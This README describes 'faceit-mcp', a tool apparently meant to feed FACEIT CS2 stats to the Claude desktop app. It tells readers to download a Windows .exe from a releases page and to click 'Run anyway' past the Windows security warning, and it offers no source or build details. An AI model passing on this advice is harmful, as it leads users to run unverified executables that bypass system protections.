# 🎯 faceit-mcp - Access real-time CS2 stats through Claude

[![Download faceit-mcp](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/saivi3171/faceit-mcp/releases)

Faceit-mcp connects your FACEIT gaming statistics directly to the Claude AI assistant. You get immediate answers about your competitive performance, match history, and Elo rating without leaving your chat window. This tool uses the Model Context Protocol to bridge your gaming data and the AI.

## 📋 What this tool does

This application acts as a bridge between the FACEIT platform and Claude. Once configured, you can ask Claude questions about your profile. 

Key features include:
* Live CS2 match tracking.
* Detailed match history reviews.
* Direct player performance comparisons.
* Real-time Elo tracking.
* Automated data updates for accurate stats.

## ⚙️ System requirements

Ensure your computer meets these requirements before you start:
* Windows 10 or Windows 11 operating system.
* A stable internet connection.
* A registered FACEIT account with a public profile.
* The Claude desktop application installed on your machine.

## 📥 How to download the software

Follow these steps to obtain the correct files:

1. Visit the [releases page](https://github.com/saivi3171/faceit-mcp/releases) to download the installer.
2. Look for the file ending in `.exe` under the Assets section.
3. Click the file name to save it to your Downloads folder.
4. Open your Downloads folder and double-click the file to begin the installation.

If Windows shows a security prompt, click "More info" and then "Run anyway." This application requires standard permissions to connect your local environment to the Claude AI assistant.

## 🛠️ Setting up the application

1. Find the application icon on your desktop or in your start menu.
2. Launch the application.
3. The app will open a local configuration window.
4. Input your FACEIT user ID or profile link when prompted.
5. Save your settings.
6. Restart the Claude desktop application to allow it to recognize the new connection.

## ❓ Frequently asked questions

### Do I need a paid FACEIT subscription?
No. This tool works with standard free accounts as long as your profile privacy is set to public.

### Is my login data safe?
This tool does not require your FACEIT password. It only reads public data available through the official FACEIT API.

### Can I track multiple players?
Yes. You can manage multiple profiles within the configuration menu. Simply add the FACEIT IDs you wish to track.

### What if the stats do not update?
Wait a few minutes for the API to refresh. If the data remains old, close the application and open it again. This forces a fresh connection check.

### Does this improve my performance?
This tool provides data context. Using this information helps you identify your strengths and weaknesses in CS2, but you must still play the game to improve.

## 🔍 Troubleshooting common issues

If you encounter errors, check these common items first:

* Connection errors: Verify your internet connection.
* Missing data: Confirm your FACEIT profile privacy settings are set to public.
* Application crashes: Ensure you installed the latest version from the releases link.
* Claude does not see the data: Make sure the Claude desktop application is updated to the latest version. Older versions may not support the necessary communication protocols.

If problems persist, check if your firewall blocks the connection. The application requires access to local network ports to communicate with the Claude desktop interface.

## 🛡️ Privacy and data usage

The application handles your gaming data locally. It communicates with the FACEIT servers to fetch stats and sends that information to your Claude session. No personal identifying information beyond your public gaming stats leaves your computer. Your account credentials remain on your device at all times.

## 🚀 Getting started with commands

Once successfully linked, use these prompt patterns in Claude:

* "What is my current Elo rating?"
* "Show me my performance in my last five matches."
* "Compare my statistics to this player [Link to profile]."
* "What is my average headshot percentage?"

Claude will process these requests by querying the data provided by this tool. The AI will then format the information into a readable summary for you. Each request updates your data to ensure you view the most recent match results.